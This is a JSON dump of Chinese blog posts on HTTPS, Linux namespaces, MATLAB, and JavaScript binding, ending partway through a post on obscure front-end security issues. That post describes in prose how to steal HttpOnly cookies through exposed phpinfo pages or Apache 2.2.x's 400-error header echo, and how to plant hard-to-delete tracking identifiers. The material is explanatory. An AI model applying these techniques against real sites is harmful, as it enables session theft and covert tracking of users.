欢迎转载！","categories":[{"name":"生态","slug":"生态","permalink":"http://www.meng.uno/categories/生态/"}],"tags":[{"name":"生态位","slug":"生态位","permalink":"http://www.meng.uno/tags/生态位/"}]},{"title":"再探HTTPS","slug":"HTTPS","date":"2016-06-16T09:31:04.000Z","updated":"2018-03-20T10:39:51.532Z","comments":true,"path":"articles/87267df0/","link":"","permalink":"http://www.meng.uno/articles/87267df0/","excerpt":"再探HTTPS 之前有一篇笔记是浅谈HTTPS的，但是比较简单的记录了下，也是懵懵懂懂的，索性把文献都翻出来，查阅一番，较为深入的理解下。 HTTP在安全方面的不足 * 通信使用明文（不加密），内容可能会被窃听 * 不验证通信方的身份，因此有可能遭遇伪装 * 无法证明报文的完整性，所以有可能已遭篡改 这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题 窃听 由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。 伪装 HTTP 协议中","text":"再探HTTPS 之前有一篇笔记是浅谈HTTPS的，但是比较简单的记录了下，也是懵懵懂懂的，索性把文献都翻出来，查阅一番，较为深入的理解下。 HTTP在安全方面的不足 通信使用明文（不加密），内容可能会被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能已遭篡改 这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题 窃听 由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。 伪装 HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。 篡改 由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack，MITM） HTTP+ 加密 + 认证 + 完整性保护 =HTTPS 通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。 SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。 共享密钥（对称密钥） &amp; 公开密钥（非对称密钥） 了解HTTPS必须要了解到一些常用的加密手段，以及其优势和劣势，因为HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。 共享密钥 加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。但是与公开密钥相比，其加密、揭秘性能高。 公开密钥 公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。 使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。 HTTPS 采用混合加密机制 看得出，服务器在提供给客户端public key时如果被第三发截获、掉包那么就有安全问题了，所有又有了第三发验证机构：数字证书认证机构（CA，Certificate Authority） 首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。 服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。 HTTPS 的安全通信机制 一切都准备好了，下一步就是利用上面的知识点做一个可靠、安全的通行链路了，具体细节可以从这个流程图例获得 请注意第2步时，当服务器给客户端返回自己的证书时，证书包含三部分内容，公钥、名称、数字签名等信息；注意数字签名是加密的，数字签名是用颁发机构的私钥对本证书的公钥，名称以及其他信息做hash散列加密而成的，所以客户端需要解密数字签名来验证该证书是否是合法可靠的，那怎么解密呢，客户端浏览器会找到该证书的根证书颁发机构，然后在本机上的证书管理器里寻找 那些受信任的根证书颁发机构列表是否有该证书的根证书颁发机构，如果有，则用该根证书的公钥解密服务器下发的证书 如果不能正常解密，则服务器下发的证书则被认为是伪造的，浏览器弹出提示框 如果能正常解密，则获取到公钥，名称，数字签名信息跟本身的公钥等其他信息比对一下，确认公钥没有被篡改，如果公钥不一致，则依然被认为是不可信的 因此客户端验证服务器的合法性取决于公钥，而公钥的合法性取决于ca证书颁发机构的合法性，这里会形成一个信任链，而终点则是CA根证书，根证书是CA机构自己办法给自己的，根证书是一个特殊的数字证书，公钥是公开的，而私钥是被CA机构保存在硬件中的，所以证书的安全性取决于你对该CA机构的信任，反过来说，加入CA机构的密钥被窃取，那么该CA机构颁发的所有证书将会存在灾难性安全问题； 就像你验证身份证是否真实，肯定去公安局验证，那么谁来保证公安局是合法可靠的呢，没人能保证，公安局自己生命自己是合法可靠的，就这么简单 SSL/TLS HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。 SSL 技术最初是由浏览器开发商网景通信公司率先倡导的，开发过 SSL3.0 之前的版本。目前主导权已转移到 IETF（Internet Engineering Task Force，Internet 工程任务组）的手中。 IETF 以 SSL3.0 为基准，后又制定了 TLS1.0、TLS1.1 和 “TLS1.2。TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。当前主流的版本是 SSL3.0 和 TLS1.0。 由于 SSL1.0 协议在设计之初被发现出了问题，就没有实际投入使用。SSL2.0 也被发现存在问题，所以很多浏览器直接废除了该协议版本。 HTTPS or Not 虽然HTTPS在安全上做到了保障，但是一份付出一分收获。 速度 SSL 的慢分两种。一种是指通信慢。另一种是指由于大量消耗 CPU 及内存等资源，导致处理速度变慢。 和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和 TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。 价格 要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。通常，一年的授权需要600人民币。 HTTPS真的可靠吗？ 没有绝对的安全 一个合法有效的SSL证书误签发给了假冒者 破解SSL证书签发CA的私钥 SSL证书签发CA的私钥泄露 破解SSL证书的私钥 SSL证书的私钥泄露 伪造一个合法有效的SSL证书 认证机构主动为假冒网站签发合法有效的服务器证书 利用可信的SSL服务器证书进行中间人攻击 在用户主机中植入伪造的根CA证书（或一个完整的CA证书链） 旁路证书可信性的验证 本文链接： http://www.meng.uno/articles/87267df0/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/tags/web/"},{"name":"https","slug":"https","permalink":"http://www.meng.uno/tags/https/"},{"name":"ssl","slug":"ssl","permalink":"http://www.meng.uno/tags/ssl/"}]},{"title":"Linux中的Namespace","slug":"namespace","date":"2016-06-10T03:44:56.000Z","updated":"2018-04-10T05:46:42.636Z","comments":true,"path":"articles/e81ea9b1/","link":"","permalink":"http://www.meng.uno/articles/e81ea9b1/","excerpt":"当前，linux实现了6种不同类型的namespaces。每种namespace，都用来包含一类特定的系统资源，这样从命名空间内部的进程来看，它们就拥有了隔离的全局资源。namespaces的一个目标就是容器，一种轻量级的虚拟化工具，让一组进程认为它们是系统上仅有的一组进程。 mount namespaces mount namespace(CLONE_NEWNS)隔离一组进程所能看到文件系统mount点。在不同mount namespaces中的进程，对于文件系统有不同的视图。在使用了mount namespaces之后，mount和umount系统调用不再对所有进程可见的，全局的moun","text":"当前，linux实现了6种不同类型的namespaces。每种namespace，都用来包含一类特定的系统资源，这样从命名空间内部的进程来看，它们就拥有了隔离的全局资源。namespaces的一个目标就是容器，一种轻量级的虚拟化工具，让一组进程认为它们是系统上仅有的一组进程。 mount namespaces mount namespace(CLONE_NEWNS)隔离一组进程所能看到文件系统mount点。在不同mount namespaces中的进程，对于文件系统有不同的视图。在使用了mount namespaces之后，mount和umount系统调用不再对所有进程可见的，全局的mount points进行操作，而是只会影响和发起调用的进程相关的mount namespace。 利用主从关系，还可以让一个mount namespace自动拥有另一个mount namespace的内容，例如一个硬盘设备挂在到某个namespace中后会自动显示在另一个namespace中。 mount namespace是linux上实现的第一种namespace。 UTS namespaces UTS namespace(CLONE_NEWUTS)隔离两种系统标识符：nodename和domainname。在容器的上下文环境中，UTS namespaces特性允许每个容器拥有自身的hostname和NIS domain name。这允许了根据容器的name来定义它们的行为，uts指的是UNIX Time-sharing System，它是传递给uname系统调用的参数。 IPC namespaces IPC namespaces(CLONE_NEWIPC)隔离inter-process communication resources，也即跨进程的通讯资源，System V IPC，以及POSIX message queues。这些IPC机制的共性时，IPC objects是由特殊机制来进行识别的，而不是文件系统的路径。在每个namespaces当中，又有其自身所拥有的System V IPC标识符和POSIX message queue filesystem。 PID namespaces PID namespaces(CLONE_NEWPID)隔离进程ID空间，也就是说，不同PID命名空间的进程，可以拥有相同的PID。这样做的一个好处是，容器能够在不同的hosts之间转移，但是又能够保持其中的进程ID不变。而且PID namespace能够允许每个容器拥有自己的init(pid 1)，对初始化、孤儿进程等事件进行处理。 从一个PID namespace的角度来看，一个进程拥有两个PID：namespace内部的PID，以及namespace外部的，host上的PID。PID namespaces也是可以层叠的，从进程所归属的PID命名空间开始，一直到根PID namespace，它都有一个PID；一个进程只能看到处于它所在PID namespace当中的，以及更下层的其他进程。 Userspace API 为了创建一个新的namespace，进程需要调用clone系统调用，并且使用CLONE_NEWPID标识位。 在一个新的namespace当中，第一个task的PID是1，它也就是这个namespace的init，以及child_reaper。但这个init是可以死亡的，此时这个namespace都会终止。 在把tasks分割出来之后，还必须对proc进行处理，让它只显示当前task可见的PID。为了实现这个目的，procfs应该在每个namespace被使用一次。 Internal API 一个task所拥有的所有PID都在struct pid中被描述了。这个数据结构如下： struct upid { int nr; /* moved from struct pid */ struct pid_namespace *ns; /* the namespace this value * is visible in */ struct hlist_node pid_chain; /* moved from struct pid */ }; struct pid { atomic_t count; struct hlist_head tasks[PIDTYPE_MAX]; struct rcu_head rcu; int level; /* the number of upids */ struct upid numbers[0]; }; 这里，struct upid表示PID值，它储存在hash当中，并且拥有PID值。为了转换得到这个pid值，可以使用task_pid_nr,pid_nr_ns(),find_task_by_vpid等函数。 这些函数的后缀有一些规律： __nr()：对“全局”的PID进行操作，这里全局指的是在整个系统中也是独一无二的。pid_nr会告诉你struct pid的global PID，这只在PID值不会离开kernel时使用。 __vnr()：对“virtual”PID进行操作，也就是进程可见的ID，例如task_pid_vnr会告诉你一个task的PID。 _nr_ns()：对指定namespace中的PID进行处理，如果希望得到某个task的PID，可以通过task_pid_nr_ns来获得pid number，在用find_task_by_pid_ns来找到这个task。这个方法在系统调用中很常见，特别是当PID来自用户空间时。在这种情况下，task可能是在另一个namespace中的。 network namespaces network namespaces(CLONE_NEWNET)将系统中与网络相关的资源隔离。也就是说，每个namespace当中拥有自身的网络设备、IP地址、IP路由表，端口号等。 network namespaces让containers能够被应用到网络的层面上。每个container能够拥有自身的网络设备、并且其应用能够被绑定到namespace中特有的端口号上，对于特定的container，还可以设置特殊的路由规则。例如，可以在同一个host系统上，运行多个用container包含的servers，并且它们都绑定了80端口。 user namespaces user namespaces(CLONE_NEWUSER)将用户和group ID空间隔离。这也就是说，在一个user namespace内外，同一个进程点user和group id可以是不同的。例如，一个进程可以在一个user namespace外部，拥有一个普通的、无特权的user ID；而在在namespace中拥有UID 0。也就是说在namespace当中拥有root权限，但在namespace外部则不行。 从Linux 3.8开始，无特权的进程能够创建它们自身的user namespaces，这为应用提供了新的可能：由于一个进程能够在其user namespaces中拥有root权限，那么它们就能够去使用那些本身只能由root用户使用的功能。但这确实会带来一些安全问题。 c++中的namespace 编程语言中的namespace，虽然拥有相同的名称，其含义是完全不同的。但主要的思想是一致的，这里的命名空间也就是将空间内定义的内容放在一个盒子里，而命名空间也就是这个区域，using namespace 空间名，就将区域引入到了操作范围之内。 这里，namespace是一种描述逻辑分组的机制，比如可以将某些属于同一个任务的类声明在同一个命名空间当中。标准C++库当中的所有内容，都被定义在命名空间std当中了。 namespace API namespace的API包含3个系统调用——clone，unshare，setns，以及一系列的/proc文件。为了指定操作的namespace类型，这3个系统调用都使用了一个CLONE_NEW常量(CLONE_NEWIPC,CLONE_NEWNS,etc)。 clone 通过clone，可以创建一个namespace，它是一个创建新的process的系统调用。其函数原型为： int clone(int (*child_func)(void *), void *child_stack, int flags, void *arg); clone可以看作fork()的通用版本，其功能能够通过flags参数CLONE_*来控制，这些参数包含了parent和child是否共享虚拟内存、打开文件描述符等。而如果参数中CLONE_NEW位被指定了，那么就会创建一个新的，对应类型的namespace，而新的进程则成为这个namespace中的一个成员。 和大多数其他的namespaces一样，创建一个UTS namespace是需要特权的，例如CAP_SYS_ADMIN，这对于避免需要设置user ID的应用来说是有必要的：如果能够使用任意的hostname，那么一个非特权用户就能够破坏lock file的作用，或者能够改变应用的行为。 /proc文件 对于每一个进程来说，都有一个/proc/PID/ns目录，这其中每一种类型的namespace，都对应了一个文件。从linux 3.9开始，这些文件都被符号链接，作为处理这个进程相关namespace的handler。 $ ls -l /proc/$$/ns # $$ is replaced by shell's PID total 0 lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 ipc -&gt; ipc:[4026531839] lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 mnt -&gt; mnt:[4026531840] lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 net -&gt; net:[4026531956] lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 pid -&gt; pid:[4026531836] lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 user -&gt; user:[4026531837] lrwxrwxrwx. 1 mtk mtk 0 Jan 8 04:12 uts -&gt; uts:[4026531838] 这些符号链接的作用之一，就是用来检查两个进程是否处于同一个命名空间当中。kernel保证如果两个进程在同一个namespace当中，那么/proc/PID/ns中的inode number就会是一致的。inode numbers能够通过stat()系统调用来得到。 但是，kernel还是会构造/proc/PID/ns的符号链接，并使得它指向字符串，这个字符串包含了namespace的类型和inode number。 如果这个符号链接被打开，那么即使namespace中的进程全部终止了，namespace也不会消被清除。 setns setns可以被用来加入一个已存在的namespace。保持一个没有任何进程的namespace，是因为随时可以加入新的进程到这个namespace当中去，这也是setns系统调用的作用。其函数原型为： int setns(int fd, int nstype); 更准确的说，setns解除一个进程和之前对应nstype的namespace的联系，并且将其关联到新的，对应类型的namespace中去。这里，fd指定了对应的namespace，它是/proc/PID/ns目录下的一个文件描述符。而nstype则会用来检查fd指向的namespace的类型。 利用setns和execve，能够构造一个很有效的工具：一个加入指定namespace然后再namespace中执行一条命令的程序。 从linux 3.8开始，setns能够加入任何类型的namespace。 unshare unshare用来离开namespace。 unshare的功能类似于clone，它创建一个新的namespaces，并且让调用者称为这个命名空间的一部分。它的主要目的，是在不创建新的进程或线程的前提下，完成namespace的分离工作。 clone() 和 if(fork() == 0) unshare() 是等价的 本文链接： http://www.meng.uno/articles/e81ea9b1/ 欢迎转载！","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"Namespace","slug":"Namespace","permalink":"http://www.meng.uno/tags/Namespace/"}]},{"title":"Matlab基本函数","slug":"matlab-func","date":"2016-06-07T11:02:10.000Z","updated":"2018-02-18T13:25:50.294Z","comments":true,"path":"articles/dbf56532/","link":"","permalink":"http://www.meng.uno/articles/dbf56532/","excerpt":"求矩阵行数/列数/维数的函数 ndims(A) 返回A的维数 size(A) 返回A各个维的最大元素个数 length(A) 返回max(size(A)) [m,n]=size(A) 如果A是二维数组，返回行数和列数 nnz(A) 返回A中非0元素的个数 取整函数 fix(x) 截尾取整 floor(x) 不超过x 的最大整数(高斯取整) ceil(x) 大于x 的最小整数 生成随机数函数 rand(n):生成0到1之间的n阶随机数方阵 rand(m,n):生成0到1之间的m×n的随机数矩阵 其他随机数生成函数 betarnd 贝塔分布的随机数生成器 binornd 二项","text":"求矩阵行数/列数/维数的函数 ndims(A) 返回A的维数 size(A) 返回A各个维的最大元素个数 length(A) 返回max(size(A)) [m,n]=size(A) 如果A是二维数组，返回行数和列数 nnz(A) 返回A中非0元素的个数 取整函数 fix(x) 截尾取整 floor(x) 不超过x 的最大整数(高斯取整) ceil(x) 大于x 的最小整数 生成随机数函数 rand(n):生成0到1之间的n阶随机数方阵 rand(m,n):生成0到1之间的m×n的随机数矩阵 其他随机数生成函数 betarnd 贝塔分布的随机数生成器 binornd 二项分布的随机数生成器 chi2rnd 卡方分布的随机数生成器 exprnd 指数分布的随机数生成器 frndf分布的随机数生成器 gamrnd 伽玛分布的随机数生成器 geornd 几何分布的随机数生成器 hygernd 超几何分布的随机数生成器 lognrnd 对数正态分布的随机数生成器 nbinrnd 负二项分布的随机数生成器 ncfrnd 非中心f分布的随机数生成器 nctrnd 非中心t分布的随机数生成器 ncx2rnd 非中心卡方分布的随机数生成器 normrnd 正态（高斯）分布的随机数生成器 poissrnd 泊松分布的随机数生成器 raylrnd 瑞利分布的随机数生成器 trnd 学生氏t分布的随机数生成器 unidrnd 离散均匀分布的随机数生成器 unifrnd 连续均匀分布的随机数生成器 weibrnd 威布尔分布的随机数生成器 基本数学函数 abs(x)：纯量的绝对值或向量的长度 angle(z)：复数z的相角(Phase angle) sqrt(x)：开平方 real(z)：复数z的实部 imag(z)：复数z的虚部 conj(z)：复数z的共轭复数 round(x)：四舍五入至最近整数 fix(x)：无论正负，舍去小数至最近整数 floor(x)：地板函数，即舍去正小数至最近整数 ceil(x)：天花板函数，即加入正小数至最近整数 rat(x)：将实数x化为分数表示 rats(x)：将实数x化为多项分数展开 sign(x)：符号函数 当x&lt;0时，sign(x)=-1 当x=0时，sign(x)=0 当x&gt;0时，sign(x)=1 rem(x,y)：求x除以y的馀数 gcd(x,y)：整数x和y的最大公因数 lcm(x,y)：整数x和y的最小公倍数 exp(x)：自然指数 pow2(x)：2的指数 log(x)：以e为底的对数，即自然对数或 log2(x)：以2为底的对数 log10(x)：以10为底的对数 常用的三角函数 sin(x)：正弦函数 cos(x)：馀弦函数 tan(x)：正切函数 asin(x)：反正弦函数 acos(x)：反馀弦函数 atan(x)：反正切函数 atan2(x,y)：四象限的反正切函数 sinh(x)：超越正弦函数 cosh(x)：超越馀弦函数 tanh(x)：超越正切函数 asinh(x)：反超越正弦函数 acosh(x)：反超越馀弦函数 atanh(x)：反超越正切函数 向量的常用函数 min(x): 向量x的元素的最小值 max(x): 向量x的元素的最大值 mean(x): 向量x的元素的平均值 median(x): 向量x的元素的中位数 std(x): 向量x的元素的标准差 diff(x): 向量x的相邻元素的差 sort(x): 对向量x的元素进行排序（Sorting） length(x): 向量x的元素个数 norm(x): 向量x的欧氏（Euclidean）长度 sum(x): 向量x的元素总和 prod(x): 向量x的元素总乘积 cumsum(x): 向量x的累计元素总和 cumprod(x): 向量x的累计元素总乘积 dot(x, y): 向量x和y的内积 cross(x, y): 向量x和y的外积 永久常数 i或j：基本虚数单位（即） eps：系统的浮点（Floating-point）精确度 inf：无限大， 例如1/0 nan或NaN：非数值（Not a number），例如0/0 pi：圆周率 realmax：系统所能表示的最大数值 realmin：系统所能表示的最小数值 nargin: 函数的输入引数个数 nargout: 函数的输出引数个数 基本绘图函数 plot: x轴和y轴均为线性刻度（Linear scale） loglog: x轴和y轴均为对数刻度（Logarithmic scale） semilogx: x轴为对数刻度，y轴为线性刻度 semilogy: x轴为线性刻度，y轴为对数刻度 plot绘图函数的参数 字元 颜色 字元 图线型态 y 黄色 . 点 k 黑色 o 圆 w 白色 x x b 蓝色 + + g 绿色 * * r 红色 - 实线 c 亮青色 : 点线 m 锰紫色 -. 点虚线 -- 虚线 注解 xlabel(‘Input Value’); % x轴注解 ylabel(‘Function Value’); % y轴注解 title(‘Two Trigonometric Functions’); % 图形标题 legend(‘y = sin(x)’,‘y = cos(x)’); % 图形注解 grid on; % 显示格线 二维绘图函数 bar 长条图 errorbar 图形加上误差范围 fplot 较精确的函数图形 polar 极座标图 hist 累计图 rose 极座标累计图 stairs 阶梯图 stem 针状图 fill 实心图 feather 羽毛图 compass 罗盘图 quiver 向量场图 本文链接： http://www.meng.uno/articles/dbf56532/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"},{"name":"MATLAB","slug":"Language/MATLAB","permalink":"http://www.meng.uno/categories/Language/MATLAB/"}],"tags":[{"name":"MATLAB","slug":"MATLAB","permalink":"http://www.meng.uno/tags/MATLAB/"}]},{"title":"JS中call、apply、bind的用法","slug":"js_call_apply_bind","date":"2016-06-07T10:45:27.000Z","updated":"2018-03-20T10:07:03.300Z","comments":true,"path":"articles/3171f70f/","link":"","permalink":"http://www.meng.uno/articles/3171f70f/","excerpt":"今天看博客时，看到了这样的一段js代码： 1 var bind = Function.prototype.call.bind(Function.prototype.bind); 我想突然看到这样的一段代码，即使js能力再强的人，可能也需要花点时间去理解。像我这样的菜鸟就更不用说了。其实，原文已经对这端代码做出了解释，但我还是想用我的想法去解释这段代码。 上面那段代码涉及到了call、bind，所以我想先区别一下call、apply、bind的用法。这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中this的指向。举个例子： 1 2 3 4 5 6 7 8 9 10","text":"今天看博客时，看到了这样的一段js代码： 1 var bind = Function.prototype.call.bind(Function.prototype.bind); 我想突然看到这样的一段代码，即使js能力再强的人，可能也需要花点时间去理解。像我这样的菜鸟就更不用说了。其实，原文已经对这端代码做出了解释，但我还是想用我的想法去解释这段代码。 上面那段代码涉及到了call、bind，所以我想先区别一下call、apply、bind的用法。这三个方法的用法非常相似，将函数绑定到上下文中，即用来改变函数中this的指向。举个例子： 12345678910 var zlw = &#123; name: &quot;zlw&quot;, sayHello: function (age) &#123; console.log(&quot;hello, i am &quot;, this.name + &quot; &quot; + age &quot; years old&quot;); &#125;&#125;;var xlj = &#123; name: &quot;xlj&quot;,&#125;;zlw.sayHello(24);// hello, i am zlw 24 years old 下面看看call、apply方法的用法： 12 zlw.sayHello.call(xlj, 24);// hello, i am xlj 24 years oldzlw.sayHello.apply(xlj, [24]);// hello, i am xlj 24 years old 结果都相同。从写法上我们就能看出二者之间的异同。相同之处在于，第一个参数都是要绑定的上下文，后面的参数是要传递给调用该方法的函数的。不同之处在于，call方法传递给调用函数的参数是逐个列出的，而apply则是要写在数组中。 我们再来看看bind方法的用法： 12 zlw.sayHello.bind(xlj, 24)(); //hello, i am xlj 24 years oldzlw.sayHello.bind(xlj, [24])(); //hello, i am xlj 24 years old bind方法传递给调用函数的参数可以逐个列出，也可以写在数组中。bind方法与call、apply最大的不同就是前者返回一个绑定上下文的函数，而后两者是直接执行了函数。由于这个原因，上面的代码也可以这样写: 12 zlw.sayHello.bind(xlj)(24); //hello, i am xlj 24 years oldzlw.sayHello.bind(xlj)([24]); //hello, i am xlj 24 years old bind方法还可以这样写fn.bind(obj, arg1)(arg2)。 用一句话总结bind的用法：该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入bind方法的第一个参数作为this，传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。 现在回到开始的那段代码： 1 var bind = Function.prototype.call.bind(Function.prototype.bind); 我们可以这样理解这段代码： 1 var bind = fn.bind(obj) fn相当于Function.prototype.call，obj相当于Function.prototype.bind。而fn.bind(obj)一般可以写成这样obj.fn，为什么呢？因为fn绑定了obj，fn中的this就指向了obj。我们知道，函数中this的指向一般是指向调用该函数的对象。所以那段代码可以写成这样: 1 var bind = Function.prototype.bind.call; 大家想一想Function.prototype.call.bind(Function.prototype.bind)返回的是什么？ 1 console.log(Function.prototype.call.bind(Function.prototype.bind)) // call() 返回的是call函数，但这个call函数中的上下文的指向是Function.prototype.bind。这个call函数可以这样用 12345678 var bind = Function.prototype.call.bind(Function.prototype.bind);var zlw = &#123; name: &quot;zlw&quot;&#125;;function hello () &#123; console.log(&quot;hello, I am &quot;, this.name);&#125;bind(hello, zlw)() // hello, I am zlw 大家可能会感到疑惑，为什么是这样写bind(hello, zlw)而不是这样写bind(zlw, hello)？既然Function.prototype.call.bind(Function.prototype.bind)相当于Function.prototype.bind.call，那么先来看下Function.prototype.bind.call怎么用。call的用法大家都知道： 1 Function.prototype.bind.call(obj, arg) 其实就相当于obj.bind(arg)。我们需要的是hello函数绑定对象zlw，即hello.bind(zlw)也就是Function.prototype.bind.call(hello, zlw)，所以应该这样写bind(hello, zlw)。 现在又有一个疑问，既然Function.prototype.call.bind(Function.prototype.bind)相当于Function.prototype.bind.call，我们为什么要这么写： 1 var bind = Function.prototype.call.bind(Function.prototype.bind); 而不直接这样写呢： 1 var bind = Function.prototype.bind.call; 先来看一个例子： 12345678910 var name = &quot;xlj&quot;;var zlw = &#123; name: &quot;zlw&quot; hello: function () &#123; console.log(this.name); &#125;&#125;;zlw.hello(); // zlwvar hello = zlw.hello;hello(); // xlj 有些人可能会意外，hello()的结果应该是zlw才对啊。其实，将zlw.hello赋值给变量hello，再调用hello()，hello函数中的this已经指向了window，与zlw.hello不再是同一个上下文，而全局变量name是window的一个属性，所以结果就是xlj。再看下面的代码： 12 var hello = zlw.hello.bind(zlw);hello(); // zlw 结果是zlw，这时hello函数与zlw.hello是同一个上下文。其实上面的疑惑已经解开了，直接这样写： 1 var bind = Function.prototype.bind.call; bind函数中的上下文已经与Function.prototype.bind.call中的不一样了，所以使用bind函数会出错。而这样写 1 var bind = Function.prototype.call.bind(Function.prototype.bind); bind函数中的上下文与Function.prototype.call.bind(Function.prototype.bind)中是一样的。 本文链接： http://www.meng.uno/articles/3171f70f/ 欢迎转载！","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://www.meng.uno/categories/JavaScript/"}],"tags":[{"name":"call","slug":"call","permalink":"http://www.meng.uno/tags/call/"},{"name":"apply","slug":"apply","permalink":"http://www.meng.uno/tags/apply/"},{"name":"bind","slug":"bind","permalink":"http://www.meng.uno/tags/bind/"}]},{"title":"那些前端安全冷门知识","slug":"safety-front-end","date":"2016-05-27T15:52:00.000Z","updated":"2018-03-20T06:59:57.928Z","comments":true,"path":"articles/23b9d6e9/","link":"","permalink":"http://www.meng.uno/articles/23b9d6e9/","excerpt":"零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。 大概分为以下章节： 盗取无法用js读写的Cookie 删不掉的本地存储 函数覆写监听上报 内存Cookie与硬盘Cookie CSS带来的点击量泄露 JSONP回调函数与UTF-7编码 过滤与代码混淆 心理学与社会工程学 资料略多，文章较长，请自备瓜子… 一、盗取无法用js读写的Cookie 为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie","text":"零、概述 提起web前端安全，大家都会想到两个名词：xss和csrf。 抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。 大概分为以下章节： 盗取无法用js读写的Cookie 删不掉的本地存储 函数覆写监听上报 内存Cookie与硬盘Cookie CSS带来的点击量泄露 JSONP回调函数与UTF-7编码 过滤与代码混淆 心理学与社会工程学 资料略多，文章较长，请自备瓜子… 一、盗取无法用js读写的Cookie 为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。 12 setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookiesetcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启 我们还是可以通过一些服务器上的漏洞去获取它们。 调试信息泄露 比较经典的是PHP的phpinfo文件： 如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。 访问phpinfo.php，将看到： 其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。 Apache 2.2.x版本请求头超长泄露 Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。 因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。 三、删不掉的本地存储 如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且&quot;永久&quot;寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。 但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案： Cookie - 是最常见的方式，key-value 模式 UserData - IE自己的本地存储，key-value 模式 localStorage - HTML5 新增的本地存储，key-value 模式 local Database - HTML5 新增的浏览器本地DataBase，是SQLite 数据库 Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器 除去这些，我还收集了一些比较“偏门”的存储方案： Silverlight的IsolatedStorage - 类似HTML5 localStorage PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值 HTTP 